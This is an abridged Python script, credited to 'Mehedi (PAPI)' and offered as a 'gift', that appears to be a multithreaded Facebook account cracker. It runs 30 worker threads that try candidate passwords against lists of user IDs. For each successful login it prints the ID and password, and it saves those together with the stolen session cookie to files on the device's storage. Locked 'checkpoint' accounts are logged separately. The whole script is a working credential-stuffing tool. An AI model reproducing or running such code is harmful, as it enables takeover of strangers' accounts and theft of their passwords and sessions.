# """script owner Mehedi (PAPI) enjoy a simple gift from me """
...
def htx_rndm():
    ...
    with tred(max_workers=30) as mehedi:
        ...
        for cudi in user:
            ...
            mehedi.submit(PAPI_cracker,uid,pss,total)
    line()
...
def PAPI_cracker(uid,pss,total):
    global ok
    global loop
    global cp
    try:
        for ps in pss:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    print(f'\033[38;5;46m[PAPI-OK] {idf}|{ps}')
                    open('/sdcard/PAPI.OK.LIVE.txt','a').write(idf+'|'+ps+'|'+coki+'\n')
                    ok.append(idf)
                    break
                else:
                    print(f'\033[38;5;46m[PAPI-OK] {idf}|{ps}')
                    open('/sdcard/PAPI.OK.DIE.txt','a').write(idf+'|'+ps+'|'+coki+'\n')
                    ok.append(idf)
                    break
                ...
                idf = "1000"+coki1[0:11]
                print(f'\033[1;31m[PAPI-CP] {idf}|{ps}')
                open('/sdcard/PAPI.CP.txt','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
